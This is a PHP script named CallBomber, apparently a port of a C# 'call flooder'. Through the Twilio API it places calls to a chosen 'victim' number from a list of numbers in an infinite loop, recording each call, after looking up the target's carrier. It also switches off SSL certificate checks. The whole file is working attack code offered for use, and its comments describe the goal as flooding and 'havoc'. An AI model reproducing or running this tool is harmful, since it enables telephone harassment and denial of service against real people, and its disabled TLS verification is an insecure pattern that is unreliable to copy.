<?php
/**
* Zachary Scally
* 07/01/2017
* PHP Implementation of the C# Call Flooder
**/
namespace CallBomber;

use Twilio\Exceptions\TwilioException;
use Twilio\Http\CurlClient;
use Twilio\Rest\Client;

class flood
{

    protected $accountSid = "";
    protected $authToken = "";

    /**
     * You can either hard code your numbers below or passthem in on the command line
     * php flood.php <victims_number> [numb1,numb2,num3,...]
     *
     * @var array
     */
    private $numbers = [];

    /**
     * twilio client
     * @var null|Client
     */
    private $twilioClient = null;

    /**
     * @var target / victum to flood
     */
    public $numberToCall;


    public function __construct($args)
    {
        //print soup logo
        $this->showLogo();

        //create our twilio client
        $this->twilioClient = new Client($this->accountSid, $this->authToken);

        //turn off ssl verify
        $this->twilioClient->setHttpClient( new CurlClient([
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_SSL_VERIFYPEER => false
        ]));

        /**
         * if argument 2 is being past let check to make sure it a list of json
         * phone numbers and then try to load them in.
         */

        if( isset($args[2]) ) {
            $this->setNumbers($args[2]);
        }

        //check to make sure $this->numbers is not empty\
        if( empty($this->numbers) ) {
            print('You must provide atleast one number example: php flood.php <target_number> [5555555555,5555555555,...]: no spaces' . "\n\n");
            die();
        }

        if( isset( $args[1] ) && $this->validatePhone($args[1]) ) {
            //start havoc!
            $this->numberToCall = $args[1]; //set the number to call
            $count = 1;
            do {
                print("Starting Call Batch: {$count} -> [" . count($this->numbers) . "] Nums.\n");
                foreach ($this->numbers as $fromNumber) {
                    $this->call($fromNumber);
                    sleep(1); //sleep 1 sec
                }
                sleep(5); //sleep 5 sec
                $count++;
            } while (true); //FOR EVER infinity!
        } else {
            print("The First Argument must be a phone number to flood. (make sure you add +1 or country code to the number).\n");
        }
        
    }

    /**
     * @param $fromNumber
     *
     * Method to call Twilio service to make the call and flood the F'uk out of someone
     * @return prints if the call was successful or not.
     */
    private function call($fromNumber)
    {
        try
        {
            $call = $this->twilioClient->calls->create(
                $this->numberToCall, // Call this number
                $fromNumber, // From a valid Twilio number
                array(
                    'Record' => true,
                    'url' => 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient'
                )
            );

            print("Starting call to: {$call->to}: from: {$call->from}\n");

        }
        catch (TwilioException $e)
        {
            print("Error on number - $fromNumber: {$e->getMessage()}\n");
        }
    }

    /**
     * @param array $numbers
     * Simple method to set private var numbers it takes a json string of numbers and converts them into an array.
    **/
    public function setNumbers($numbers)
    {
        try{
            $nums = json_decode($numbers, true);
            if( !empty($nums) && is_array($nums) ) {
                $this->numbers = $nums;
            } else {
                throw new \Exception('Not a valid json string list of numbers must be past in like [5555555555,5555555555,...]: no spaces');
            }
        } catch (\Exception $e) {
            print("Unable to parse phone number list: {$e->getMessage()}\n\n");
        }
    }

    /**
     * This method checks with the twilio service that the number is valid before we try to make a call to it!
     *  it does code 0.01cent per check but give usefull insight into the number.
     *
     * @param $toNumber
     * @return bool
     */
    private function validatePhone($toNumber)
    {
        try {
            $number = $this->twilioClient->lookups
                ->phoneNumbers($toNumber)
                ->fetch(
                    array("type" => "carrier")
                );

            print("Valid Number - $toNumber - Phone to blast Info [" . print_r($number->carrier, true) . "] \n\n");
            return true;

        } catch (TwilioException $e) {
            print("Invalid phone number to flood - {$e->getMessage()}\n\n");
        }
        die();
    }

    /**
     * Simple method to show our logo
     * @return prints out soup logo.
     */
    protected function showLogo()
    {
        //print our Soup logo
        print("   _____ ____  __  ______  \n");
        print("  / ___// __ \/ / / / __ \ \n");
        print("  \__ \/ / / / / / / /_/ / \n");
        print(" ___/ / /_/ / /_/ / ____/  \n");
        print("/____/\____/\____/_/   `PHP\n\n\n");
    }
}

//include the composer autoloader
require_once('vendor/autoload.php');
new flood($argv);